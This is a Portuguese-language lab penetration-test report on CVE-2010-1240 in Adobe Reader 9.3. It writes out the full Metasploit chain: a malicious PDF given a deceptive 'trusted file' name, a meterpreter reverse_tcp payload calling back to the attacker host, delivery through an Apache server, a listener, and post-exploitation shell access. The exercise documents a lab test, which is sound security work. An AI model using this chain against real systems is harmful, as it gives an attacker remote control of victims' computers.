<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATÓRIO TÉCNICO: ANÁLISE DE VULNERABILIDADE (CVE-2010-1240)</h1>

<p><strong>DOCUMENTO DE NÍVEL CONFIDENCIAL</strong><br>
<strong>Data da Operação:</strong> 19 de Novembro de 2025<br>
<strong>Responsáveis Técnicos:</strong> Yuri Alexander e Gabriel Machado<br>
<strong>Objeto de Análise:</strong> Exploração de Falha em Client-Side (Adobe Reader 9.3)</p>

<hr>

<h3>EVIDÊNCIA EM VÍDEO (YouTube & Local)</h3>
<p>Registro visual da operação realizada em ambiente de laboratório:</p>

<div align="center" style="margin-bottom: 20px;">
    <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
        <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
             alt="Assistir Vídeo no YouTube" 
             style="width:100%; max-width:600px; border: 2px solid #333;">
    </a>
    <p>🔴 <strong><a href="https://youtu.be/lntV_v_hTH0">Clique aqui para assistir no YouTube</a></strong></p>
</div>
<p><i>Backup local (video.mp4):</i></p>
<div style="background-color:#000; text-align:center; padding:10px;">
    <video width="100%" height="auto" controls>
        <source src="video.mp4" type="video/mp4">
        Seu navegador não suporta a tag de vídeo.
    </video>
</div>

<hr>

<h3>1. RESUMO DO CENÁRIO</h3>
<p>A operação consistiu em um teste de intrusão focado em Engenharia Social e exploração de vulnerabilidade de software desatualizado. O objetivo foi obter acesso remoto a uma estação de trabalho Windows XP através de um arquivo PDF malicioso.</p>

<ul>
    <li><strong>Máquina Atacante (Kali Linux):</strong> IP 192.168.20.2 (Interface eth0)</li>
    <li><strong>Máquina Alvo (Windows XP):</strong> Sub-rede 192.168.20.x, executando Adobe Reader 9.3</li>
    <li><strong>Vetor de Ataque:</strong> Metasploit Framework / Apache Web Server</li>
</ul>

<hr>

<h3>2. EXECUÇÃO TÉCNICA DETALHADA</h3>

<h4>Fase 1: Configuração do Exploit (Adobe PDF Embedded EXE)</h4>
<p>Os analistas selecionaram o módulo responsável por embutir um executável malicioso dentro de uma estrutura de arquivo PDF. Esta técnica depende da interação do usuário para ser efetiva.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
</pre>

<h4>Fase 2: Definição do Payload e Parâmetros de Rede</h4>
<p>Nesta etapa, foi configurado o código que estabelece a conexão reversa (o alvo conecta no atacante). O nome do arquivo foi definido como "ArquivoConfiavel.pdf" para aumentar a probabilidade de execução pela vítima.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(...) > set LHOST 192.168.20.2
msf exploit(...) > set LPORT 4444
msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf</code>
</pre>

<blockquote style="background-color:#eee; padding:10px; border-left: 5px solid #555;">
<strong>NOTA DE TROUBLESHOOTING (ANÁLISE DE FALHA):</strong><br>
Durante a execução inicial, a conexão reversa falhou. A equipe identificou, através da interface gráfica de rede do Kali Linux ("Wired connection 1"), que o endereço IP local não correspondia ao configurado no exploit.
<br><br>
<strong>Ação Corretiva:</strong> O comando <code>set LHOST 192.168.20.2</code> foi reexecutado e o exploit foi gerado novamente para garantir a integridade da conexão.
</blockquote>

<p><strong>Geração do Artefato Final:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > exploit
# [+] Arquivo gerado com sucesso em: /root/.msf4/local/ArquivoConfiavel.pdf</code>
</pre>

<h4>Fase 3: Distribuição (Delivery)</h4>
<p>Para simular um cenário real de download, o arquivo foi movido para o diretório público do servidor web Apache.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code># Cópia do arquivo para o servidor web
cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
</pre>

<h4>Fase 4: Configuração do Handler (Escuta)</h4>
<p>O console do Metasploit foi configurado para aguardar conexões na porta 4444.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.2
msf exploit(handler) > exploit</code>
</pre>

<hr>

<h3>3. COMPROMETIMENTO DO ALVO</h3>

<p>A sequência de ações na máquina da vítima resultou na execução do código arbitrário:</p>
<ol>
    <li>O usuário acessou o endereço <code>http://192.168.20.2</code> via Internet Explorer.</li>
    <li>O download do arquivo <strong>ArquivoConfiavel.pdf</strong> foi realizado para o Desktop.</li>
    <li>Ao abrir o arquivo, o Adobe Reader exibiu o alerta de segurança: <em>"The file and its viewer application are set to be launched by this PDF file"</em>.</li>
    <li>O usuário ignorou o aviso e clicou no botão <strong>Open</strong>.</li>
</ol>
<p><em>Comportamento observado: Uma janela de prompt de comando (CMD) apareceu brevemente e fechou, indicando a injeção do processo na memória.</em></p>

<hr>

<h3>4. PÓS-EXPLORAÇÃO E EVIDÊNCIAS</h3>

<p>Imediatamente após a ação do usuário, a sessão foi estabelecida no console do atacante.</p>

<pre style="background-color:#333; color:#fff; padding:10px;">
<code>[*] Sending stage (179771 bytes) to 192.168.20.x
[*] Meterpreter session 1 opened (192.168.20.2:4444 -> 192.168.20.x:1045)</code>
</pre>

<p>Para confirmar o nível de acesso, foram executados os seguintes comandos:</p>

<p><strong>1. Captura de Tela (Reconhecimento Visual)</strong></p>
<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
<code>meterpreter > screenshot
# Screenshot saved to /root/screenshot.jpeg</code>
</pre>

<p><strong>2. Acesso ao Shell do Sistema (Controle Total)</strong></p>
<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
<code>meterpreter > shell
C:\Documents and Settings\Administrator\Desktop></code>
</pre>

<hr>

<h3>5. CONCLUSÃO</h3>
<p>O teste foi concluído com êxito, demonstrando vulnerabilidade crítica no ambiente analisado. A combinação de software desatualizado com a falta de conscientização do usuário permitiu o comprometimento total da confidencialidade e integridade do sistema alvo.</p>
